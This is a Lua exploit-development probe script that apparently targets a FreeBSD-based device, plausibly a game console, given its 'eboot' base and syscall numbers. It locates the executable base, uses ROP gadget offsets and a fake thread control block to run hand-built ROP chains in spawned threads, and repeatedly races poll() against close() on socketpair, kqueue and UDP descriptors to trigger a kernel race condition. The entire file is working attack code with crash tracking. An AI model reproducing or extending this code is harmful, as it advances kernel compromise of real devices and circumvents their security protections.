-- CRASH_CLASS: MODERATE
-- PROBE 509a: poll/close race — clean output, no sleep, faithful to 500a
--
-- 507a's output went binary after thr_new (known stdout corruption bug).
-- This probe avoids the corruption by:
-- 1. Writing ALL results to a heap buffer, then printing once at the end
-- 2. Matching 500a's timing: child closes IMMEDIATELY (no sleep)
-- 3. Using socketpair write to signal completion instead of memory markers
--
-- Test plan:
-- [A] Verify child close works (1 iteration, no poll)
-- [B] 5x race: poll(fd, POLLIN, 5000) + child close(fd) simultaneously
-- [C] Same with kqueue fd
-- [D] Same with UDP socket

print("=== PROBE 509a: poll/close race (clean output) ===")
print("")

------------------------------------------------------------------ helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_hex(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

-- Log buffer: accumulate messages, print all at once at the end
-- This avoids the stdout corruption from memory.read_qword
local log_lines = {}
local function log(msg)
    table.insert(log_lines, msg)
end
local function flush_log()
    for _, line in ipairs(log_lines) do
        print(line)
    end
    log_lines = {}
end

------------------------------------------------------------------ syscalls
local sc6    = make_syscall(6)
local sc20   = make_syscall(20)
local sc73   = make_syscall(73)
local sc97   = make_syscall(97)
local sc135  = make_syscall(135)
local sc209  = make_syscall(209)
local sc240  = make_syscall(240)
local sc362  = make_syscall(362)
local sc455  = make_syscall(455)
local sc477  = make_syscall(477)
local sc593  = make_syscall(593)
local sc624  = make_syscall(624)

local pid = to_num(sc20())
print("pid: " .. pid)

-- eboot base
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = safe_rd(info + 0x108)
local eb_hi = safe_rd(info + 0x10C)
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))
print("eboot: " .. fmt_hex(eboot))

local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if not fn_str then print("FATAL: no fn_addr"); return end
local fn_addr = uint64(fn_str)
print("fn_addr: " .. fn_str)

-- gadgets
local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local pop_rsi_ret = eboot + uint64(0xD77D)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)

-- fake TCB
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFF8, 8 do safe_wq(fake_tcb + i, fake_tcb) end
local tcb_ptr = memory.alloc(8)
safe_wq(tcb_ptr, fake_tcb)

-- sleep helper
local ts_buf = memory.alloc(16)
local function msleep(ms)
    safe_wq(ts_buf, uint64(0))
    safe_wq(ts_buf + 8, uint64(ms * 1000000))
    pcall(function() sc240(uint64(to_num(ts_buf)), uint64(0)) end)
end

local STACK_SIZE = 0x200000

print("setup done")
print("")

-- ============================================================
-- spawn_closer: child thread that does sysarch(SET_FSBASE) then close(fd)
-- then writes marker, then thr_exit.  NO SLEEP — instant close.
-- ============================================================
local function spawn_closer(target_fd, marker_addr)
    local child_stack = sc477(uint64(0), uint64(STACK_SIZE), uint64(0x3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    if to_num(child_stack) == 0 then return nil end

    local top = child_stack + uint64(STACK_SIZE)
    local top_lo = to_num(top)
    local rsp = top - uint64(top_lo % 16) - uint64(8)

    local off = 0
    local function wq(val) safe_wq(rsp + off, val); off = off + 8 end

    -- sysarch(SET_FSBASE=129, tcb_ptr)
    wq(tcb_ptr)
    wq(pop_rax_ret)
    wq(uint64(165))
    wq(fn_addr)

    -- close(target_fd) — IMMEDIATE, no sleep
    wq(pop_rdi_ret)
    wq(uint64(target_fd))
    wq(pop_rax_ret)
    wq(uint64(6))
    wq(fn_addr)

    -- write marker = 0x44444444
    wq(pop_rdi_ret)
    wq(marker_addr)
    wq(pop_rax_ret)
    wq(uint64(0x44444444))
    wq(mov_rdi_rax_ret)

    -- thr_exit(0)
    wq(pop_rdi_ret)
    wq(uint64(0))
    wq(pop_rax_ret)
    wq(uint64(431))
    wq(fn_addr)

    -- thr_param
    local param = memory.alloc(0x40)
    for j = 0, 0x38, 4 do safe_wd(param + j, 0) end
    safe_wq(param + 0x00, pop_rsi_ret)
    safe_wq(param + 0x08, uint64(129))
    safe_wq(param + 0x10, child_stack)
    safe_wq(param + 0x18, uint64(STACK_SIZE))
    local tid_buf = memory.alloc(8)
    safe_wq(tid_buf, uint64(0))
    safe_wq(param + 0x30, tid_buf)

    local t_ok = pcall(function()
        sc455(uint64(to_num(param)), uint64(0x38))
    end)

    return child_stack
end

-- ============================================================
-- [A] Verify child close works alone (no poll)
-- ============================================================
log("=== [A] Child close verification (no poll) ===")

local sv = memory.alloc(8)
safe_wd(sv, 0xFFFFFFFF); safe_wd(sv + 4, 0xFFFFFFFF)
pcall(function() sc135(uint64(1), uint64(2), uint64(0), uint64(to_num(sv))) end)
local fd0, fd1 = safe_rd(sv), safe_rd(sv + 4)
log(string.format("  socketpair fds: [%d, %d]", fd0 or -1, fd1 or -1))

local marker_a = memory.alloc(8)
safe_wq(marker_a, uint64(0xAAAAAAAA))

local stack_a = spawn_closer(fd0, marker_a)
msleep(100)

local mk_a = to_num(safe_rq(marker_a))
log(string.format("  marker: 0x%X %s", mk_a, mk_a == 0x44444444 and "[CHILD OK]" or "[CHILD FAILED]"))

-- verify fd is closed
local ok_fa, ret_fa = pcall(function()
    return make_syscall(189)(uint64(fd0), memory.alloc(0x100))
end)
if ok_fa then
    log("  fstat(fd0) after: ret=" .. to_num(ret_fa) .. (to_num(ret_fa) == -1 and " [CLOSED]" or " [OPEN?]"))
end

pcall(function() sc6(uint64(fd1)) end)
if stack_a then pcall(function() sc73(stack_a, uint64(STACK_SIZE)) end) end

-- ============================================================
-- [B] poll/close race — AF_UNIX socketpair, 5 iterations
-- ============================================================
log("")
log("=== [B] RACE: poll+close AF_UNIX (5 iter, no sleep) ===")

local race_survived = 0

for i = 1, 5 do
    -- fresh socketpair each iteration
    safe_wd(sv, 0xFFFFFFFF); safe_wd(sv + 4, 0xFFFFFFFF)
    local sp_ok = pcall(function()
        sc135(uint64(1), uint64(2), uint64(0), uint64(to_num(sv)))
    end)
    local rfd0, rfd1 = safe_rd(sv), safe_rd(sv + 4)

    if not sp_ok or not rfd0 or rfd0 > 0xFFF0 then
        log(string.format("  [%d] socketpair failed", i))
        break
    end

    local marker_b = memory.alloc(8)
    safe_wq(marker_b, uint64(0xAAAAAAAA))

    -- pollfd struct
    local pollfd = memory.alloc(8)
    safe_wd(pollfd, rfd0)
    safe_wd(pollfd + 4, 0x0001)  -- POLLIN

    -- spawn child: close rfd0 IMMEDIATELY
    local stack_b = spawn_closer(rfd0, marker_b)

    -- RACE: enter blocking poll right after child spawn
    local poll_ok, poll_ret = pcall(function()
        return sc209(uint64(to_num(pollfd)), uint64(1), uint64(5000))
    end)

    local poll_rv = -999
    if poll_ok then poll_rv = to_num(poll_ret) end
    local revents = safe_rd(pollfd + 4)
    local rev_hi = 0
    if revents then rev_hi = math.floor(revents / 65536) % 65536 end

    msleep(20)  -- let child finish
    local mk_b = to_num(safe_rq(marker_b))

    log(string.format("  [%d] poll=%d rev=0x%04X child=%s",
        i, poll_rv, rev_hi, mk_b == 0x44444444 and "OK" or "FAIL"))

    race_survived = race_survived + 1

    pcall(function() sc6(uint64(rfd1)) end)
    if stack_b then pcall(function() sc73(stack_b, uint64(STACK_SIZE)) end) end
end

log("  survived: " .. race_survived .. "/5")

-- ============================================================
-- [C] poll/close race — kqueue fd, 5 iterations
-- ============================================================
log("")
log("=== [C] RACE: poll+close kqueue (5 iter) ===")

local kq_survived = 0
for i = 1, 5 do
    local ok_kq, kq_fd = pcall(function() return sc362() end)
    local kfd = 0
    if ok_kq then kfd = to_num(kq_fd) end
    if kfd < 1 then
        log(string.format("  [%d] kqueue failed", i))
        break
    end

    local marker_c = memory.alloc(8)
    safe_wq(marker_c, uint64(0xAAAAAAAA))

    local pollfd = memory.alloc(8)
    safe_wd(pollfd, kfd)
    safe_wd(pollfd + 4, 0x0001)

    local stack_c = spawn_closer(kfd, marker_c)

    local poll_ok, poll_ret = pcall(function()
        return sc209(uint64(to_num(pollfd)), uint64(1), uint64(5000))
    end)

    local poll_rv = -999
    if poll_ok then poll_rv = to_num(poll_ret) end
    local revents = safe_rd(pollfd + 4)
    local rev_hi = 0
    if revents then rev_hi = math.floor(revents / 65536) % 65536 end

    msleep(20)
    local mk_c = to_num(safe_rq(marker_c))

    log(string.format("  [%d] poll=%d rev=0x%04X child=%s",
        i, poll_rv, rev_hi, mk_c == 0x44444444 and "OK" or "FAIL"))

    kq_survived = kq_survived + 1
    if stack_c then pcall(function() sc73(stack_c, uint64(STACK_SIZE)) end) end
end

log("  survived: " .. kq_survived .. "/5")

-- ============================================================
-- [D] poll/close race — UDP socket, 5 iterations
-- ============================================================
log("")
log("=== [D] RACE: poll+close UDP (5 iter) ===")

local udp_survived = 0
for i = 1, 5 do
    local ok_u, u_fd = pcall(function()
        return sc97(uint64(2), uint64(2), uint64(0))
    end)
    local ufd = 0
    if ok_u then ufd = to_num(u_fd) end
    if ufd < 1 then
        log(string.format("  [%d] UDP socket failed", i))
        break
    end

    local marker_d = memory.alloc(8)
    safe_wq(marker_d, uint64(0xAAAAAAAA))

    local pollfd = memory.alloc(8)
    safe_wd(pollfd, ufd)
    safe_wd(pollfd + 4, 0x0001)

    local stack_d = spawn_closer(ufd, marker_d)

    local poll_ok, poll_ret = pcall(function()
        return sc209(uint64(to_num(pollfd)), uint64(1), uint64(5000))
    end)

    local poll_rv = -999
    if poll_ok then poll_rv = to_num(poll_ret) end
    local revents = safe_rd(pollfd + 4)
    local rev_hi = 0
    if revents then rev_hi = math.floor(revents / 65536) % 65536 end

    msleep(20)
    local mk_d = to_num(safe_rq(marker_d))

    log(string.format("  [%d] poll=%d rev=0x%04X child=%s",
        i, poll_rv, rev_hi, mk_d == 0x44444444 and "OK" or "FAIL"))

    udp_survived = udp_survived + 1
    if stack_d then pcall(function() sc73(stack_d, uint64(STACK_SIZE)) end) end
end

log("  survived: " .. udp_survived .. "/5")

-- ============================================================
-- [E] VM ops + sentinel check
-- ============================================================
log("")
log("=== [E] Post-race verification ===")

local vm_final = to_num(sc624())
log("  VM ops: " .. vm_final)

local pid2 = to_num(sc20())
log("  pid: " .. pid2 .. (pid2 == pid and " [OK]" or " [CHANGED!]"))

-- ============================================================
-- FLUSH all log to stdout
-- ============================================================
print("")
print("--- BUFFERED OUTPUT START ---")
flush_log()
print("--- BUFFERED OUTPUT END ---")
print("")
print("=== PROBE 509a COMPLETE ===")
